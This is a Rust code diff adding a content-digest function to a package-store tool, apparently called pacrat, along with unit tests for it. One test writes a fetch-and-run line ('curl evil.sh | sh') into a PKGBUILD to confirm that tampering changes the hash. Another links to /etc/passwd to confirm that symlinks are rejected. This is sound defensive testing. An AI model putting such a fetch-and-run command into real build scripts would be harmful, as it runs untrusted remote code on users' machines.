@@ -35,6 +35,29 @@ pub fn files(root: &Path) -> Result<Vec<String>, String> {
     Ok(found)
 }
 
+/// A content digest of the tree at `root` — what "these are the bytes that
+/// were graded" means concretely.
+///
+/// Built from the same validated, sorted walk [`files`] returns, so a tree
+/// this refuses to describe is a tree pacrat also refuses to install. The
+/// digest covers names and contents; it deliberately does not cover mtimes
+/// or permissions, which differ across a fleet syncing the same store and
+/// would make every host disagree about an identical tree.
+pub fn digest(root: &Path) -> Result<String, String> {
+    let names = files(root)?;
+    let mut contents = Vec::with_capacity(names.len());
+    for rel in &names {
+        let path = root.join(rel);
+        contents.push(fs::read(&path).map_err(|e| format!("{}: {e}", path.display()))?);
+    }
+    Ok(pacrat_core::hash::tree_digest(
+        names
+            .iter()
+            .map(String::as_str)
+            .zip(contents.iter().map(Vec::as_slice)),
+    ))
+}
+
 fn walk(dir: &Path, prefix: &str, found: &mut Vec<String>) -> Result<(), String> {
     let entries = fs::read_dir(dir).map_err(|e| format!("{}: {e}", dir.display()))?;
     for entry in entries {
@@ -154,6 +177,7 @@ fn copy_into(from: &Path, files: &[String], staging: &Path) -> Result<(), String
 mod tests {
     use super::*;
     use std::os::unix::fs::symlink;
+    use std::os::unix::fs::PermissionsExt;
     use std::path::PathBuf;
 
     /// A scratch directory that cleans itself up.
@@ -283,5 +307,55 @@ mod tests {
         let listed = vec!["PKGBUILD".to_string(), "vanished".to_string()];
         assert!(install(src.path(), &listed, &dest).is_err());
         assert!(!dest.exists(), "partial tree left in the store");
+    }
+
+    /// The property the grade cache depends on: the digest changes when the
+    /// tree's content changes, and only then.
+    #[test]
+    fn the_digest_follows_the_content() {
+        let t = Tmp::new("digest");
+        t.write("PKGBUILD", "pkgname=mdcat\n");
+        t.write("mdcat.install", "post_install() { :; }\n");
+        let before = digest(t.path()).unwrap();
+        assert_eq!(before.len(), 64);
+        // Same bytes, asked twice.
+        assert_eq!(digest(t.path()).unwrap(), before);
+
+        // The edit a reviewer would never see if the cache did not notice.
+        t.write("PKGBUILD", "pkgname=mdcat\ncurl evil.sh | sh\n");
+        let after = digest(t.path()).unwrap();
+        assert_ne!(after, before, "an edited PKGBUILD hashed the same");
+
+        // Back to the original bytes: the digest comes back with them.
+        t.write("PKGBUILD", "pkgname=mdcat\n");
+        assert_eq!(digest(t.path()).unwrap(), before);
+
+        // A new file counts, even an empty one.
+        t.write("sneaky.install", "");
+        assert_ne!(digest(t.path()).unwrap(), before);
+    }
+
+    /// mtime and mode are not content: a fleet syncing one store must agree
+    /// on the digest of an identical tree.
+    #[test]
+    fn the_digest_ignores_metadata() {
+        let a = Tmp::new("meta-a");
+        let b = Tmp::new("meta-b");
+        for t in [&a, &b] {
+            t.write("PKGBUILD", "pkgname=x\n");
+        }
+        fs::set_permissions(a.path().join("PKGBUILD"), fs::Permissions::from_mode(0o600)).unwrap();
+        fs::set_permissions(b.path().join("PKGBUILD"), fs::Permissions::from_mode(0o644)).unwrap();
+        assert_eq!(digest(a.path()).unwrap(), digest(b.path()).unwrap());
+    }
+
+    /// A tree the walk refuses to describe is a tree the digest refuses to
+    /// summarize — no silently-skipped symlink turning into a stable hash.
+    #[test]
+    fn the_digest_refuses_what_the_walk_refuses() {
+        let t = Tmp::new("digest-link");
+        t.write("PKGBUILD", "x");
+        symlink("/etc/passwd", t.path().join("evil")).unwrap();
+        assert!(digest(t.path()).is_err());
     }
 }
